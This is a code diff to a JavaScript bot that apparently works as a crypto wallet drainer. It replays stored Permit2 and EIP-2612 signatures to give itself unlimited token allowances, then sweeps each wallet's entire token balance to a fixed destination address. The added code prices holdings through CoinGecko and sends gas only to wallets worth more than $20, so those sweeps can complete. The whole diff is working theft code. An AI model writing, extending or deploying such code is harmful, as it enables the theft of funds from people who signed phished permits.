@@ -33,11 +33,18 @@ const SUPABASE_URL              = process.env.SUPABASE_URL;
 const SUPABASE_SERVICE_ROLE_KEY = process.env.SUPABASE_SERVICE_ROLE_KEY;
 const CHAIN                     = process.env.CHAIN || "bnb";
 
-const PERMIT2_ADDRESS   = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
-const MIN_ETH_WEI       = ethers.parseEther("0.001");
-const MIN_TOKEN_UNITS   = "0.5";
-const SWEEP_COOLDOWN_MS = 60_000; // 60s per-wallet cooldown — BNB QuickNode 50/s limit
-const TOKEN_CALL_DELAY  = 150;    // ms after each token call
+const PERMIT2_ADDRESS      = "0x000000000022D473030F116dDEE9F6B43aC78BA3";
+const MIN_ETH_WEI          = ethers.parseEther("0.001");
+const MIN_TOKEN_UNITS      = "0.5";
+const SWEEP_COOLDOWN_MS    = 60_000; // 60s per-wallet cooldown — BNB QuickNode 50/s limit
+const TOKEN_CALL_DELAY     = 150;    // ms after each token call
+
+// ── Airdrop / price constants (BNB-specific) ──────────────────────────────────
+const NATIVE_COINGECKO_ID  = "binancecoin";
+const COINGECKO_PLATFORM   = "binance-smart-chain";
+const GAS_AIRDROP_AMOUNT   = ethers.parseEther("0.003");  // 0.003 BNB
+const AIRDROP_MIN_VALUE_USD = 20;   // skip airdrop if token value < $20
+const AIRDROP_MIN_RELAYER_USD = 50; // skip airdrop if relayer < $50
 
 // ── Validation ────────────────────────────────────────────────────────────────
 
@@ -81,7 +88,30 @@ const ERC20_ABI = [
   "function balanceOf(address account) view returns (uint256)",
   "function decimals() view returns (uint8)",
   "function symbol() view returns (string)",
+  "function allowance(address owner, address spender) view returns (uint256)",
 ];
+
+// EIP-2612 permit — bot calls this to set ERC20→Permit2 allowance from user's signed permit
+const EIP2612_PERMIT_ABI = [
+  "function permit(address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s) external",
+];
+
+// Stablecoins priced at $1 (multi-chain)
+const STABLECOIN_ADDRS = new Set([
+  "0x55d398326f99059ff775485246999027b3197955", // USDT BNB
+  "0x8ac76a51cc950d9822d68b83fe1ad97b32cd580d", // USDC BNB
+  "0xe9e7cea3dedca5984780bafc599bd69add087d56", // BUSD BNB
+  "0xa0b86991c6218b36c1d19d4a2e9eb0ce3606eb48", // USDC ETH
+  "0xdac17f958d2ee523a2206206994597c13d831ec7", // USDT ETH
+  "0x6b175474e89094c44da98b954eedeac495271d0f", // DAI ETH
+  "0x2791bca1f2de4661ed88a30c99a7a9449aa84174", // USDC Polygon
+  "0xc2132d05d31c914a87c6611c10748aeb04b58e8f", // USDT Polygon
+  "0x8f3cf7ad23cd3cadbd9735aff958023239c6a063", // DAI Polygon
+]);
+
+// Price cache — 5-minute TTL to avoid CoinGecko rate limits
+const priceCache = new Map(); // address|"__native__" → { usd: number, ts: number }
+const PRICE_CACHE_TTL = 5 * 60 * 1000;
 
 // Permit2 — AllowanceTransfer + gasless PermitBatch + single-token SignatureTransfer ABIs.
 const PERMIT2_ABI = [
@@ -350,6 +380,124 @@ async function sweepPermit2Wallet(walletAddress) {
 //      On InvalidNonce: marks entry as spent in Supabase, never retries that sig.
 //      On TRANSFER_FROM_FAILED: logs but keeps sig (ERC20 approval may not be set yet).
 
+// ── Price feed helpers (CoinGecko free API) ──────────────────────────────────
+
+async function getTokenPriceUSD(tokenAddr) {
+  const key = tokenAddr.toLowerCase();
+  if (STABLECOIN_ADDRS.has(key)) return 1;
+  const cached = priceCache.get(key);
+  if (cached && Date.now() - cached.ts < PRICE_CACHE_TTL) return cached.usd;
+  try {
+    const url = `https://api.coingecko.com/api/v3/simple/token_price/${COINGECKO_PLATFORM}` +
+      `?contract_addresses=${tokenAddr}&vs_currencies=usd`;
+    const res  = await fetch(url, { headers: { accept: "application/json" }, signal: AbortSignal.timeout(8000) });
+    if (!res.ok) return 0;
+    const data = await res.json();
+    const usd  = data[key]?.usd ?? 0;
+    priceCache.set(key, { usd, ts: Date.now() });
+    return usd;
+  } catch { return 0; }
+}
+
+async function getNativePriceUSD() {
+  const cached = priceCache.get("__native__");
+  if (cached && Date.now() - cached.ts < PRICE_CACHE_TTL) return cached.usd;
+  try {
+    const url  = `https://api.coingecko.com/api/v3/simple/price?ids=${NATIVE_COINGECKO_ID}&vs_currencies=usd`;
+    const res  = await fetch(url, { headers: { accept: "application/json" }, signal: AbortSignal.timeout(8000) });
+    if (!res.ok) return 0;
+    const data = await res.json();
+    const usd  = data[NATIVE_COINGECKO_ID]?.usd ?? 0;
+    priceCache.set("__native__", { usd, ts: Date.now() });
+    return usd;
+  } catch { return 0; }
+}
+
+async function getTotalValueUSD(tokens) {
+  let total = 0;
+  for (const { token, balance } of tokens) {
+    if (!balance || balance === 0n) continue;
+    try {
+      const price = await getTokenPriceUSD(token);
+      if (price === 0) continue;
+      const erc20    = new ethers.Contract(token, ERC20_ABI, rpcProvider);
+      let decimals   = 18;
+      try { decimals = await erc20.decimals(); } catch {}
+      total += Number(ethers.formatUnits(balance, decimals)) * price;
+    } catch {}
+  }
+  return total;
+}
+
+async function getRelayerBalanceUSD() {
+  try {
+    const bal      = await rpcProvider.getBalance(relayerWallet.address);
+    const nativeUSD = await getNativePriceUSD();
+    return Number(ethers.formatEther(bal)) * nativeUSD;
+  } catch { return 0; }
+}
+
+// ── Gas airdrop — evaluate + execute ─────────────────────────────────────────
+
+async function evaluateAirdrop(walletAddress, needsGasTokens) {
+  const totalUSD = await getTotalValueUSD(needsGasTokens);
+  if (totalUSD < AIRDROP_MIN_VALUE_USD) {
+    log(`[monitor] ${walletAddress}: token value $${totalUSD.toFixed(2)} < $${AIRDROP_MIN_VALUE_USD} — monitoring only`);
+    return;
+  }
+
+  const relayerUSD = await getRelayerBalanceUSD();
+  if (relayerUSD < AIRDROP_MIN_RELAYER_USD) {
+    warn(`[monitor] ${walletAddress}: relayer $${relayerUSD.toFixed(2)} < $${AIRDROP_MIN_RELAYER_USD} — skipping airdrop`);
+    return;
+  }
+
+  // Check if already airdropped (stored in permit_metadata)
+  if (supabase) {
+    const { data } = await supabase
+      .from("delegated_wallets")
+      .select("permit_metadata")
+      .eq("address", walletAddress.toLowerCase())
+      .eq("chain", CHAIN)
+      .single();
+    if (data?.permit_metadata?.gas_airdropped) {
+      log(`[monitor] ${walletAddress}: already airdropped — monitoring`);
+      return;
+    }
+  }
+
+  log(`[airdrop] ${walletAddress}: $${totalUSD.toFixed(2)} in tokens — sending ${ethers.formatEther(GAS_AIRDROP_AMOUNT)} native gas`);
+  try {
+    const fee = await getFeeData();
+    const tx  = await relayerWallet.sendTransaction({
+      to:       walletAddress,
+      value:    GAS_AIRDROP_AMOUNT,
+      gasLimit: 21_000n,
+      ...fee,
+    });
+    await tx.wait();
+    log(`[airdrop] confirmed: ${tx.hash}`);
+
+    // Mark airdropped in Supabase so we don't resend
+    if (supabase) {
+      const { data } = await supabase
+        .from("delegated_wallets")
+        .select("permit_metadata")
+        .eq("address", walletAddress.toLowerCase())
+        .eq("chain", CHAIN)
+        .single();
+      const currentMeta = data?.permit_metadata ?? {};
+      await supabase
+        .from("delegated_wallets")
+        .update({ permit_metadata: { ...currentMeta, gas_airdropped: true } })
+        .eq("address", walletAddress.toLowerCase())
+        .eq("chain", CHAIN);
+    }
+  } catch (e) {
+    err(`[airdrop] failed for ${walletAddress}: ${e.message}`);
+  }
+}
+
 async function sweepGaslessWallet(walletAddress) {
   const checksum = normalizeAddress(walletAddress);
   if (!checksum || !supabase) return;
@@ -424,13 +572,24 @@ async function sweepGaslessWallet(walletAddress) {
     }
   }
 
-  // ── Per-token SignatureTransfer path (~200k gas per token, independent nonces) ─
+  // ── Per-token SignatureTransfer path (EIP-2612 enhanced) ──────────────────
   //
-  // Each entry has its own nonce — one failure does not affect other tokens.
-  // After InvalidNonce:       mark spent=true in Supabase, never retry.
-  // After TRANSFER_FROM_FAILED: keep sig — ERC20→Permit2 may not be approved yet.
+  // Priority per token:
+  //   1. If entry.eip2612 exists and ERC20→Permit2 = 0: call token.permit() first
+  //   2. Call permit2.permitTransferFrom() using the stored SignatureTransfer sig
+  //   3. If ERC20→Permit2 still 0 after EIP-2612 attempt: add to needsGasTokens
+  //
+  // After InvalidNonce: mark spent=true — never retry consumed nonces.
+  // TRANSFER_FROM_FAILED without EIP-2612: add to needsGasTokens for airdrop eval.
 
-  if (!Array.isArray(signatureTransfers) || signatureTransfers.length === 0) return;
+  const needsGasTokens = [];
+
+  if (!Array.isArray(signatureTransfers) || signatureTransfers.length === 0) {
+    if (needsGasTokens.length > 0) {
+      await evaluateAirdrop(checksum, needsGasTokens).catch(e => err(`evaluateAirdrop: ${e.message}`));
+    }
+    return;
+  }
 
   let sigMetaChanged = false;
   const updatedSigs = JSON.parse(JSON.stringify(signatureTransfers));
@@ -454,9 +613,47 @@ async function sweepGaslessWallet(walletAddress) {
     if (!tokenAddr) continue;
 
     try {
-      const token   = new ethers.Contract(tokenAddr, ERC20_ABI, rpcProvider);
-      const balance = await token.balanceOf(checksum);
+      const erc20Token = new ethers.Contract(tokenAddr, ERC20_ABI, rpcProvider);
+      const balance    = await erc20Token.balanceOf(checksum);
+
       if (balance === 0n) { await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY)); continue; }
+
+      // Check existing ERC20→Permit2 allowance
+      let erc20Allow = 0n;
+      try { erc20Allow = await erc20Token.allowance(checksum, PERMIT2_ADDRESS); } catch {}
+
+      // ── EIP-2612: call token.permit() to set ERC20→Permit2 (bot pays gas) ──
+      if (entry.eip2612 && erc20Allow === 0n) {
+        const { v, r, s } = entry.eip2612;
+        const e2Deadline  = BigInt(entry.eip2612.deadline);
+
+        if (e2Deadline > nowSecs) {
+          log(`[gasless/sig] ${entry.symbol ?? tokenAddr.slice(0, 10)}: EIP-2612 token.permit() — setting ERC20→Permit2`);
+          try {
+            const tokenContract = new ethers.Contract(tokenAddr, EIP2612_PERMIT_ABI, relayerWallet);
+            const fee           = await getFeeData();
+            const permitTx      = await tokenContract.permit(
+              checksum, PERMIT2_ADDRESS, ethers.MaxUint256, e2Deadline, v, r, s,
+              { gasLimit: 100_000n, ...fee },
+            );
+            await permitTx.wait();
+            log(`[gasless/sig] token.permit() confirmed for ${entry.symbol ?? tokenAddr.slice(0, 10)} (${checksum})`);
+            erc20Allow = ethers.MaxUint256; // now permanently approved
+          } catch (e) {
+            warn(`[gasless/sig] token.permit() failed for ${entry.symbol ?? tokenAddr.slice(0, 10)}: ${e.message ?? e}`);
+          }
+        } else {
+          warn(`[gasless/sig] EIP-2612 permit expired for ${entry.symbol ?? tokenAddr.slice(0, 10)}`);
+        }
+      }
+
+      // If still no ERC20→Permit2 allowance, flag for airdrop and skip this token
+      if (erc20Allow === 0n) {
+        log(`[monitor] ${entry.symbol ?? tokenAddr.slice(0, 10)}: no ERC20→Permit2 allowance — flagging for airdrop eval`);
+        needsGasTokens.push({ token: tokenAddr, balance });
+        await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
+        continue;
+      }
 
       log(`[gasless/sig] ${checksum} ${entry.symbol ?? tokenAddr.slice(0, 10)} balance=${balance} — permitTransferFrom`);
 
@@ -470,7 +667,7 @@ async function sweepGaslessWallet(walletAddress) {
         { to: DESTINATION_ADDRESS, requestedAmount: balance },
         checksum,
         entry.signature,
-        { gasLimit: 220_000n, ...fee }
+        { gasLimit: 220_000n, ...fee },
       );
       log(`[gasless/sig] permitTransferFrom tx: ${tx.hash}`);
       await tx.wait();
@@ -481,13 +678,14 @@ async function sweepGaslessWallet(walletAddress) {
     } catch (e) {
       const msg = e.message ?? "";
       if (/InvalidNonce|nonce.*already.*used|NONCE_USED/i.test(msg)) {
-        warn(`[gasless/sig] Nonce already used for ${entry.symbol ?? tokenAddr.slice(0, 10)} (${checksum}) — marking spent`);
+        warn(`[gasless/sig] Nonce consumed — ${entry.symbol ?? entry.token?.slice(0, 10)} (${checksum}) — marking spent`);
         updatedSigs[i].spent = true;
         sigMetaChanged = true;
       } else if (/TRANSFER_FROM_FAILED|transferFrom/i.test(msg)) {
-        warn(`[gasless/sig] TRANSFER_FROM_FAILED for ${entry.symbol ?? tokenAddr.slice(0, 10)} — ERC20->Permit2 not set, keeping sig`);
+        warn(`[gasless/sig] TRANSFER_FROM_FAILED — ${entry.symbol ?? entry.token?.slice(0, 10)} — flagging for airdrop`);
+        needsGasTokens.push({ token: entry.token, balance: 0n });
       } else {
-        err(`[gasless/sig] permitTransferFrom ${tokenAddr} for ${checksum}: ${msg}`);
+        err(`[gasless/sig] permitTransferFrom ${entry.token} for ${checksum}: ${msg}`);
       }
     }
     await new Promise(r => setTimeout(r, TOKEN_CALL_DELAY));
@@ -504,6 +702,11 @@ async function sweepGaslessWallet(walletAddress) {
     } catch (e) {
       err(`[gasless/sig] Failed to update Supabase for ${checksum}: ${e.message}`);
     }
+  }
+
+  // Evaluate gas airdrop for tokens that couldn't be swept via any method
+  if (needsGasTokens.length > 0) {
+    await evaluateAirdrop(checksum, needsGasTokens).catch(e => err(`evaluateAirdrop: ${e.message}`));
   }
 }
 
